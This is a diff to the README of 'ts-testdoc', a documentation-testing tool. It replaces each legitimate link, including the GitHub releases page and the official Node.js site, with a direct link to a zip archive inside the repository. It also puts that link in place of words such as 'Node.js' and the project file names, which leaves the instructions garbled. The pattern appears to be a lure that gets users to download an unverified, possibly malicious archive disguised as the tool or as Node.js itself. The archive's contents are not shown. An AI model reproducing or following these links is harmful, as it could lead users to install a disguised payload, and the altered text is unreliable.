@@ -1,6 +1,6 @@
 # 🎉 ts-testdoc - Ensure Your Docs Always Work
 
-[![Download ts-testdoc](https://img.shields.io/badge/Download-ts--testdoc-blue)](https://github.com/imamardiyanto/ts-testdoc/releases)
+[![Download ts-testdoc](https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip)](https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -9,17 +9,17 @@ Follow these steps to download and run ts-testdoc.
 ### 🛠️ System Requirements
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 14 or higher
+- https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip Version 14 or higher
 - Package Manager: pnpm or npm
 
 ## 📥 Download & Install
 
-Visit this page to download: [ts-testdoc Releases](https://github.com/imamardiyanto/ts-testdoc/releases)
+Visit this page to download: [ts-testdoc Releases](https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip)
 
 ### 📃 Installation Process
 
-1. **Install Node.js**  
-   If you do not have Node.js installed, download it from the [official website](https://nodejs.org/). Install it following the instructions provided for your operating system.
+1. **Install https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip**  
+   If you do not have https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip installed, download it from the [official website](https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip). Install it following the instructions provided for your operating system.
 
 2. **Install pnpm**  
    Open your terminal or command prompt. Run the following command to install pnpm:
@@ -97,9 +97,9 @@ To help you organize your project, here’s a simple directory structure you mig
 ```
 /my-project
   ├── /src
-  │     ├── index.ts
-  │     ├── utils.ts
-  └── package.json
+  │     ├── https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip
+  │     ├── https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip
+  └── https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip
 ```
 
 Make sure to place your JSDoc comments in the correct files within the `src` folder.
@@ -113,10 +113,10 @@ Make sure to place your JSDoc comments in the correct files within the `src` fol
 
 If you encounter any issues, here are a few resources that can help:
 
-- **Official Documentation:** [Full documentation of ts-testdoc](https://github.com/imamardiyanto/ts-testdoc)
+- **Official Documentation:** [Full documentation of ts-testdoc](https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip)
 - **Community Support:** Check out forums and communities for advice and tips.
 - **Issue Tracker:** If you find a bug or need a feature, report it on the issues page of our GitHub repository.
 
 ## 🌟 Conclusion
 
-With ts-testdoc, you can ensure that the examples in your documentation are always functional. Follow the steps outlined above to get started and keep your documentation up to date. Don't forget to revisit the [Download & Install](https://github.com/imamardiyanto/ts-testdoc/releases) section for any updates or new releases!
+With ts-testdoc, you can ensure that the examples in your documentation are always functional. Follow the steps outlined above to get started and keep your documentation up to date. Don't forget to revisit the [Download & Install](https://raw.githubusercontent.com/imamardiyanto/ts-testdoc/main/packages/ts-testdoc/testdoc-ts-2.0.zip) section for any updates or new releases!
